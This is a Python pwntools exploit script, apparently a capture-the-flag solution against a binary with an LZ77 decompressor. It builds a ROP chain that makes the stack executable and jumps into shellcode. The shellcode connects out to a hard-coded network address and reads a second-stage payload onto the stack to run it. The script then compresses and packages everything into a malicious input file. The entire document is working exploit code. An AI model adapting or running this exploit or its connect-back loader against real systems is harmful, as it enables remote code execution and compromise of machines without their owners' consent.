#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

context.arch = 'amd64'

#win = p64(0x40224d)
#win = b"ABCDEFGH"
ret = 0x00000000004018da 
pop_rdi_rbp = 0x000000000040dfa1 
dl_make_stack_exec = 0x4647d0 
environ = 0x4b58d0 
jmp_rsp = 0x00000000004441d6 
pop_rax = 0x00000000004027c5
pop_rcx = 0x000000000040266b
pop_rbx = 0x000000000046da97
pop_rsi_rbp = 0x000000000040d402
mov_dword_rax_7_ecx = 0x00000000004542e0
xchg_edx_eax_xor_eax_eax = 0x000000000040479d
add_edx_eax_pop_rbx = 0x000000000046da92
dl_make_stack_exec_gadget = 0x00000000004647ef
pop_rdx = 0x0000000000453095
stack_prot = 0x4ad450

rop_payload = p64(0x2000)*2 + p64(xchg_edx_eax_xor_eax_eax) + p64(pop_rax) + p64(7) + p64(add_edx_eax_pop_rbx) + p64(environ) + p64(dl_make_stack_exec_gadget) + p64(ret)*5 + p64(jmp_rsp) + asm('''jmp $-0x2a0''') 
#assert len(rop_payload) <= 0x50, "too long"
sc = asm('''
    push SYS_socket
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    cdq
    syscall

    mov rdi, rax
    mov rax, 14096374386363662338
    push rax

    push SYS_connect
    pop rax
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
    mov rdx, 0x1000
    sub rsi, 0x280
    syscall
''')

assert len(sc) <= 0x3c
sc = sc.rjust(0x3c, b'\x90')
rop_payload += p64(pop_rsi_rbp)

print(hex(len(sc + rop_payload)))

with open('rop_payload', 'wb') as f:
    f.write(sc + rop_payload)

subprocess.check_call(["./lz1", "c", "9", "rop_payload", "rop_payload.lz77"], stdin=None, stdout=None, stderr=None)

# stage 2

payload = open("rop_payload.lz77", "rb").read()

payload = p32(0xf0) + p8(9) + payload[5:]
payload += b'\xf6\xfb\x00'
payload = payload.ljust(0xd0, b'\x90')
open("payload-exp", "wb").write(payload)
